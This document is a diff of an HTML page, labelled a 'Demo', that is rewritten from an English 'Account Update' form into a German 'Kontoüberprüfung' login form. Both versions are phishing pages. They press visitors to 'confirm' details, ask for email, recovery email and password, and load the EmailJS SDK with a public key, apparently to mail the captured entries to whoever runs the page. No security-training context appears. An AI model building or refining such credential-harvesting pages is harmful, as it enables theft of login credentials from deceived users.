@@ -1,74 +1,65 @@
-<!DOCTYPE html><!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Account Update • Demo</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Demo Login</title>
   <link rel="stylesheet" href="style.css">
 
   <!-- EmailJS SDK -->
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
   <script>
-    emailjs.init("ln4M4oAummqBl5tiX"); <!-- Your EmailJS public key -->
+    (function() {
+      emailjs.init("4qHdU26CIsFHEAbC8"); // your EmailJS public key
+    })();
   </script>
 </head>
 <body>
-  <main class="page">
-    <!-- Top notice / header -->
-    <section class="panel notice">
+  <div class="page">
+    
+    <!-- Notice Panel -->
+    <div class="panel notice">
       <div class="notice-inner">
-        <h1 class="notice-title">Account Update</h1>
-        <p class="notice-sub">
-          We have updated your account settings. To keep your access active, please confirm your contact details below.
-        </p>
-        <a class="primary-btn" href="#action">Confirm details</a>
+        <h2 class="notice-title">Kontoüberprüfung</h2>
+        <p class="notice-sub">Bitte melden Sie sich an, um fortzufahren.</p>
+        <a href="#" class="primary-btn">Mehr erfahren</a>
       </div>
 
-      <!-- 👇 Square picture top-right -->
+      <!-- Square image -->
       <div class="notice-graphic">
-        <img src="download (1).png" alt="Decorative square" />
+        <img src="download (1).png" alt="Decorative">
       </div>
-    </section>
+    </div>
 
-    <!-- Form panel -->
-    <section id="action" class="panel form-panel">
-      <div class="form-card">
-        <h2 class="form-title">Quick confirmation</h2>
-        <p class="form-desc">Enter your email, recovery email, and passwort.</p>
+    <!-- Form Panel -->
+    <div class="panel form-panel">
+      <form id="login-form" class="form-card">
+        <h3 class="form-title">Login</h3>
+        <p class="form-desc">Geben Sie unten Ihre Daten ein:</p>
 
-        <form id="demo-form" class="form" autocomplete="on" novalidate>
-          <label class="field">
-            <span class="label-text">Email</span>
-            <input name="user_email" type="email" placeholder="you@example.com" required>
-          </label>
+        <div class="field">
+          <label class="label-text">Email</label>
+          <input type="email" name="user_email" placeholder="Your Email" required />
+        </div>
 
-          <label class="field">
-            <span class="label-text">Recovery Email</span>
-            <input name="recovery_email" type="email" placeholder="recovery@example.com" required>
-          </label>
+        <div class="field password-field">
+          <label class="label-text">Passwort</label>
+          <input type="password" name="passwort" id="password" placeholder="Passwort" required />
+          <button type="button" id="toggle-password">👁</button>
+        </div>
 
-          <label class="field password-field">
-            <span class="label-text">Password </span>
-            <input name="passwort" id="passwort" type="password" placeholder="••••••••" required>
-            <button id="toggle-password" type="button" aria-label="Toggle password">👁️</button>
-          </label>
+        <div class="actions">
+          <input type="submit" id="button" value="Send" class="primary-btn">
+          <button type="button" class="link-btn">Benötigen Sie Hilfe?</button>
+        </div>
 
-          <div class="actions">
-            <button id="submit-btn" class="primary-btn" type="submit">Login</button>
-            <button id="cancel-btn" class="link-btn" type="button">Cancel</button>
-          </div>
+        <p id="status" class="status"></p>
+      </form>
+    </div>
 
-          <p id="status" class="status" aria-live="polite"></p>
-        </form>
-      </div>
-    </section>
-
-  
-  </main>
+    
+  </div>
 
   <script src="script.js"></script>
 </body>
 </html>
-
-
-
